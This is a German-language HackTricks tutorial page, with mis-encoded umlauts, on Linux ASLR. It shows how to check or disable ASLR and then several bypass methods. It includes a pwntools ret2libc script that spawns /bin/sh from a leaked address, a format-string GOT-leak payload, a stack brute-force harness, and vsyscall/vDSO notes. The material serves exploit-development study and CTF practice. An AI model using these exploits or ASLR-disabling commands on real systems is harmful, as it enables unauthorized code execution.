# ASLR

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegende Informationen

**Address Space Layout Randomization (ASLR)** ist eine Sicherheitstechnik, die in Betriebssystemen verwendet wird, um die **Speicheradressen zu randomisieren**, die von System- und Anwendungsprozessen verwendet werden. Dadurch wird es f√ºr einen Angreifer erheblich schwieriger, den Ort bestimmter Prozesse und Daten vorherzusagen, wie z. B. den Stack, den Heap und Bibliotheken, wodurch bestimmte Arten von Exploits, insbesondere Puffer√ºberl√§ufe, abgemildert werden.

### **√úberpr√ºfen des ASLR-Status**

Um den ASLR-Status auf einem Linux-System zu **√ºberpr√ºfen**, k√∂nnen Sie den Wert aus der Datei **`/proc/sys/kernel/randomize_va_space`** lesen. Der in dieser Datei gespeicherte Wert bestimmt den Typ des angewendeten ASLR:

* **0**: Keine Randomisierung. Alles ist statisch.
* **1**: Konservative Randomisierung. Gemeinsam genutzte Bibliotheken, Stack, mmap(), VDSO-Seite werden randomisiert.
* **2**: Vollst√§ndige Randomisierung. Zus√§tzlich zu den Elementen, die durch konservative Randomisierung randomisiert werden, wird der durch `brk()` verwaltete Speicher randomisiert.

Sie k√∂nnen den ASLR-Status mit dem folgenden Befehl √ºberpr√ºfen:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivierung von ASLR**

Um ASLR zu **deaktivieren**, setzen Sie den Wert von `/proc/sys/kernel/randomize_va_space` auf **0**. Die Deaktivierung von ASLR wird im Allgemeinen au√üerhalb von Test- oder Debugging-Szenarien nicht empfohlen. So k√∂nnen Sie es deaktivieren:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Du kannst ASLR auch f√ºr eine Ausf√ºhrung deaktivieren mit:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivierung von ASLR**

Um ASLR zu **aktivieren**, k√∂nnen Sie einen Wert von **2** in die Datei `/proc/sys/kernel/randomize_va_space` schreiben. Dies erfordert in der Regel Root-Berechtigungen. Die vollst√§ndige Randomisierung kann mit dem folgenden Befehl durchgef√ºhrt werden:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenz √ºber Neustarts hinweg**

√Ñnderungen, die mit den `echo`-Befehlen vorgenommen werden, sind vor√ºbergehend und werden beim Neustart zur√ºckgesetzt. Um die √Ñnderung dauerhaft zu machen, m√ºssen Sie die Datei `/etc/sysctl.conf` bearbeiten und die folgende Zeile hinzuf√ºgen oder √§ndern:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Nachdem du `/etc/sysctl.conf` bearbeitet hast, wende die √Ñnderungen mit an:
```bash
sudo sysctl -p
```
Dies stellt sicher, dass Ihre ASLR-Einstellungen √ºber Neustarts hinweg bestehen bleiben.

## **Umgehungen**

### 32-Bit-Brute-Force

PaX teilt den Prozess-Adressraum in **3 Gruppen** auf:

* **Code und Daten** (initialisiert und nicht initialisiert): `.text`, `.data` und `.bss` ‚Äî> **16 Bits** Entropie in der Variablen `delta_exec`. Diese Variable wird zuf√§llig mit jedem Prozess initialisiert und zu den Anfangsadressen hinzugef√ºgt.
* **Speicher**, der von `mmap()` allokiert wurde, und **gemeinsam genutzte Bibliotheken** ‚Äî> **16 Bits**, genannt `delta_mmap`.
* **Der Stack** ‚Äî> **24 Bits**, bezeichnet als `delta_stack`. Es werden jedoch effektiv **11 Bits** verwendet (vom 10. bis zum 20. Byte einschlie√ülich), ausgerichtet auf **16 Bytes** ‚Äî> Dies ergibt **524.288 m√∂gliche reale Stack-Adressen**.

Die vorherigen Daten gelten f√ºr 32-Bit-Systeme, und die reduzierte endg√ºltige Entropie erm√∂glicht es, ASLR zu umgehen, indem der Angriff so oft wiederholt wird, bis er erfolgreich abgeschlossen ist.

#### Brute-Force-Ideen:

* Wenn Sie gen√ºgend Platz f√ºr ein **gro√ües NOP-Schlitten vor dem Shellcode** haben, k√∂nnten Sie einfach Adressen im Stack brute-forcen, bis der Fluss **√ºber einen Teil des NOP-Schlittens springt**.
* Eine weitere Option daf√ºr, falls der √úberlauf nicht so gro√ü ist und der Angriff lokal ausgef√ºhrt werden kann, besteht darin, **den NOP-Schlitten und den Shellcode in einer Umgebungsvariablen hinzuzuf√ºgen**.
* Wenn der Angriff lokal ist, k√∂nnen Sie versuchen, die Basisadresse von libc per Brute-Force zu ermitteln (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die Adresse der `libc`-Funktion `usleep` durch **Brute-Force** zu ermitteln und dabei 10 als Argument zu √ºbergeben. Wenn der **Server zu einem bestimmten Zeitpunkt 10 Sekunden l√§nger braucht, um zu antworten**, haben Sie die Adresse dieser Funktion gefunden.

{% hint style="success" %}
Bei 64-Bit-Systemen ist die Entropie viel h√∂her und dies sollte nicht m√∂glich sein.
{% endhint %}

### Brute-Forcing des 64-Bit-Stacks

Es ist m√∂glich, einen gro√üen Teil des Stacks mit Umgebungsvariablen zu belegen und dann versuchen, den Bin√§rcode hunderte/tausende Male lokal zu missbrauchen, um ihn auszunutzen.\
Der folgende Code zeigt, wie es m√∂glich ist, **einfach eine Adresse im Stack auszuw√§hlen** und bei **jeder Ausf√ºhrung alle paar hundert Male** wird diese Adresse die **NOP-Anweisung** enthalten:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### Lokale Informationen (`/proc/[pid]/stat`)

Die Datei **`/proc/[pid]/stat`** eines Prozesses ist immer von jedem lesbar und enth√§lt interessante Informationen wie:

- **startcode** & **endcode**: Adressen √ºber und unter dem **TEXT** des Bin√§rdatei
- **startstack**: Die Adresse des Starts des **Stacks**
- **start\_data** & **end\_data**: Adressen √ºber und unter denen sich der **BSS** befindet
- **kstkesp** & **kstkeip**: Aktuelle **ESP** und **EIP**-Adressen
- **arg\_start** & **arg\_end**: Adressen √ºber und unter denen sich die **CLI-Argumente** befinden.
- **env\_start** & **env\_end**: Adressen √ºber und unter denen sich die **Umgebungsvariablen** befinden.

Daher ist es m√∂glich, wenn der Angreifer auf demselben Computer wie das ausgebeutete Bin√§rprogramm ist und dieses Bin√§rprogramm keinen √úberlauf von Rohargumenten erwartet, sondern von einer anderen **Eingabe, die nach dem Lesen dieser Datei erstellt werden kann**. Es ist f√ºr einen Angreifer m√∂glich, **einige Adressen aus dieser Datei zu erhalten und Offset daraus f√ºr den Exploit zu konstruieren**.

{% hint style="success" %}
F√ºr weitere Informationen zu dieser Datei siehe [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) und suche nach `/proc/pid/stat`
{% endhint %}

### Ein Leck haben

- **Die Herausforderung besteht darin, ein Leck zu haben**

Wenn Ihnen ein Leck gegeben wird (einfache CTF-Herausforderungen), k√∂nnen Sie Offset daraus berechnen (angenommen, Sie kennen beispielsweise die genaue libc-Version, die im System verwendet wird, das Sie ausnutzen). Dieses Beispiel-Exploit wird aus dem [**Beispiel von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) extrahiert (√ºberpr√ºfen Sie diese Seite f√ºr weitere Details):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Durch Ausnutzen eines Puffer√ºberlaufs w√§re es m√∂glich, einen **ret2plt** zu manipulieren, um die Adresse einer Funktion aus der libc zu exfiltrieren. √úberpr√ºfen Sie:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Genau wie bei ret2plt, wenn Sie √ºber eine Schwachstelle bei Formatzeichenfolgen einen beliebigen Lesezugriff haben, ist es m√∂glich, die Adresse einer **libc-Funktion** aus dem GOT zu exfiltrieren. Das folgende [**Beispiel stammt von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Sie k√∂nnen weitere Informationen zum willk√ºrlichen Lesen von Formatzeichenfolgen finden unter:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Versuchen Sie, ASLR zu umgehen, indem Sie Adressen im Stack missbrauchen:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

Der **`vsyscall`**-Mechanismus dient dazu, die Leistung zu verbessern, indem bestimmte Systemaufrufe im Benutzerbereich ausgef√ºhrt werden k√∂nnen, obwohl sie grunds√§tzlich Teil des Kernels sind. Der entscheidende Vorteil von **vsyscalls** liegt in ihren **festen Adressen**, die nicht der **ASLR** (Adressraumlayout-Zufallsanordnung) unterliegen. Diese feste Natur bedeutet, dass Angreifer keine Informationsleckschwachstelle ben√∂tigen, um ihre Adressen zu bestimmen und in einem Exploit zu verwenden.\
Es werden jedoch keine besonders interessanten Gadgets gefunden (obwohl es zum Beispiel m√∂glich ist, ein `ret;`-√Ñquivalent zu erhalten)

(Das folgende Beispiel und der Code stammen aus [**diesem Writeup**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

Ein Angreifer k√∂nnte beispielsweise die Adresse `0xffffffffff600800` in einem Exploit verwenden. W√§hrend der Versuch, direkt zu einer `ret`-Anweisung zu springen, nach der Ausf√ºhrung einiger Gadgets zu Instabilit√§t oder Abst√ºrzen f√ºhren k√∂nnte, kann das Springen zum Beginn eines `syscall` aus dem **vsyscall**-Abschnitt erfolgreich sein. Durch sorgf√§ltiges Platzieren eines **ROP**-Gadgets, das die Ausf√ºhrung zu dieser **vsyscall**-Adresse f√ºhrt, kann ein Angreifer eine Codeausf√ºhrung erreichen, ohne **ASLR** f√ºr diesen Teil des Exploits umgehen zu m√ºssen.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

Beachten Sie daher, wie es m√∂glich sein k√∂nnte, **ASLR zu umgehen, indem Sie das vdso missbrauchen**, wenn der Kernel mit CONFIG\_COMPAT\_VDSO kompiliert ist, da die vdso-Adresse nicht zuf√§llig ist. Weitere Informationen finden Sie unter:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}
